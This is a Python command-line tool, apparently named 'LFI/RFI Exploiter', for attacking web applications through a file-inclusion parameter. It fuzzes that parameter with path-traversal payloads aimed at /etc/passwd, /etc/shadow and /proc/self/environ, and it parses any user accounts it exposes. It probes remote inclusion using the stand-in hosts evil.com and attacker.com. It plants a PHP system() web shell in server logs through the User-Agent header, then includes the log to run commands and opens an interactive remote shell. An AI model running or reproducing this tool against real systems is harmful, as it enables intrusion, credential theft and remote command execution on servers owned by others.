import argparse
import requests
import csv
import json
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from tqdm import tqdm

# list of common lfi file path payloads
DEFAULT_LFI_PATHS = [
    '../../../../../etc/passwd',
    '../../../../etc/passwd',
    '../../../etc/shadow',
    '../../../../../proc/self/environ',
    '../../../../../windows/win.ini',
    '../../../../../boot.ini',
    '../../../../../etc/hosts',
]

# list of common rfi url payloads;; expandable 
DEFAULT_RFI_URLS = [
    'http://evil.com/shell.txt',
    'https://attacker.com/malicious.txt',
]

# list of strings characteristically found in lfi 
EVIDENCE = [
    "root:x:", "[boot loader]", "[fonts]", "PATH=", "<?php"
]

# malicious code to be injected in log files for rce;; can edit code to take in more outputs
LOG_POISON_PAYLOADS = [
    '<?php echo "CMD:"; system($_GET["cmd"]); ?>',
]

# list of common paths to web server access logs for lfi;; can add more
LOG_LOCATIONS = [
    '/var/log/apache2/access.log',
    '/var/log/httpd/access_log',
    '/var/log/nginx/access.log',
    '../../../../../var/log/apache2/access.log',
]

# function that reconstructs the url with the payload
def inject_payload(url, param, payload):
    parsed = urlparse(url)
    qs = parse_qs(parsed.query)
    qs[param] = payload
    q = urlencode(qs, doseq=True)
    return urlunparse((parsed.scheme, parsed.netloc, parsed.path, '', q, ''))

# function that extracts important info from a passwd file if found
def parse_passwd(content):
    users = []
    for line in content.splitlines():
        if line.startswith("root:") or line.startswith("daemon:") or line.startswith("user:"):
            parts = line.split(":")
            if len(parts) >= 3:
                users.append((parts[0], parts[2]))
    return users

# function that injects code into a server-side log file for lfi rce 
def poison_log(url, user_agent_payload):
    headers = {'User-Agent': user_agent_payload}
    try:
        requests.get(url, headers=headers, timeout=5)
    except:
        pass

# function that automates log poisoning then attempts to include the poisoned log file for rce 
def attempt_lfi_rce(url, param):
    print("|*| Attempting LFI to RCE via log poisoning...")
    for payload in LOG_POISON_PAYLOADS:
        poison_log(url, payload)
        for log_path in LOG_LOCATIONS:
            test_url = inject_payload(url, param, log_path)
            try:
                r = requests.get(test_url, timeout=8)
                if "CMD:" in r.text:
                    print(f"|+| RCE log inclusion success: {test_url}")
                    return test_url
            except:
                continue
    return None

# function that outlines an interactive shell for further exploitation after rce is achieved
def interactive_shell(rce_url):
    print(f"|+| Interactive LFI-RCE Shell at: {rce_url}?cmd=COMMAND")
    while True:
        try:
            cmd = input("DM-CD$_$ ")
            if cmd.lower() in ('exit', 'quit'):
                break
            r = requests.get(rce_url, params={'cmd': cmd}, timeout=10)
            if "CMD:" in r.text:
                print(r.text.split("CMD:")[1].strip())
            else:
                print("|!| No command output.")
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"|!| Error: {e}")

# function that iterates through previous lists to map out vulnerabilities for either lfi or rfi and outputs it, including in json or csv
def scan_inclusion(url, param, lfi_paths, rfi_urls, method="GET", null_byte=True):
    print(f"|*| Scanning '{param}' for LFI/RFI...")
    findings = []

    for path in tqdm(lfi_paths, desc="LFI"):
        test_paths = [path]
        if null_byte and not path.endswith('%00'):
            test_paths.append(path + '%00')
        for p in test_paths:
            test_url = inject_payload(url, param, p)
            try:
                r = requests.post(test_url, timeout=9) if method == "POST" else requests.get(test_url, timeout=9)
                for marker in EVIDENCE:
                    if marker in r.text:
                        snippet = r.text[:100].replace('\n', ' ')
                        findings.append({"payload": p, "type": "LFI", "marker": marker, "preview": snippet})
                        if "root:x:" in marker:
                            parsed = parse_passwd(r.text)
                            for user in parsed:
                                print(f"[*] User found: {user[0]} (UID: {user[1]})")
            except:
                continue

    for remote in tqdm(rfi_urls, desc="RFI"):
        test_url = inject_payload(url, param, remote)
        try:
            r = requests.get(test_url, timeout=9)
            if r.status_code in (200, 301, 302):
                findings.append({"payload": remote, "type": "RFI", "marker": "", "preview": r.text[:80]})
        except:
            continue

    if findings:
        print(f"|+| {len(findings)} potential findings.")
    else:
        print("|*| No inclusions confirmed.")
    return findings

def save_results(findings, out_prefix):
    if findings:
        csv_path = f"{out_prefix}.csv"
        json_path = f"{out_prefix}.json"

        with open(csv_path, "w", newline="") as f:
            writer = csv.DictWriter(f, fieldnames=["payload", "type", "marker", "preview"])
            writer.writeheader()
            writer.writerows(findings)
        print(f"|+| CSV saved: {csv_path}")

        with open(json_path, "w") as f:
            json.dump(findings, f, indent=2)
        print(f"|+| JSON saved: {json_path}")

# arg parser for cli customizability
def cli():
    parser = argparse.ArgumentParser(description="Python LFI/RFI Exploiter")
    parser.add_argument("url", help="Target URL with vulnerable param (e.g., http://site.com/page.php?page=...)")
    parser.add_argument("param", help="Vulnerable parameter name (e.g., page)")
    parser.add_argument("--lfi", help="Custom LFI payload list")
    parser.add_argument("--rfi", help="Custom RFI URLs list")
    parser.add_argument("--no-null", action="store_true", help="Disable null byte fuzzing")
    parser.add_argument("--method", choices=["GET", "POST"], default="GET", help="HTTP method")
    parser.add_argument("--out", default="findings", help="Output file prefix for CSV/JSON")
    parser.add_argument("--rce", action="store_true", help="Attempt log file RCE")
    parser.add_argument("--shell", action="store_true", help="Enter interactive shell after RCE")

    args = parser.parse_args()

    lfi_paths = open(args.lfi).read().splitlines() if args.lfi else DEFAULT_LFI_PATHS
    rfi_urls = open(args.rfi).read().splitlines() if args.rfi else DEFAULT_RFI_URLS

    findings = scan_inclusion(
        url=args.url,
        param=args.param,
        lfi_paths=lfi_paths,
        rfi_urls=rfi_urls,
        method=args.method,
        null_byte=not args.no_null
    )

    save_results(findings, args.out)

    if args.rce or args.shell:
        rce_url = attempt_lfi_rce(args.url, args.param)
        if rce_url and args.shell:
            interactive_shell(rce_url)

if __name__ == "__main__":
    cli()
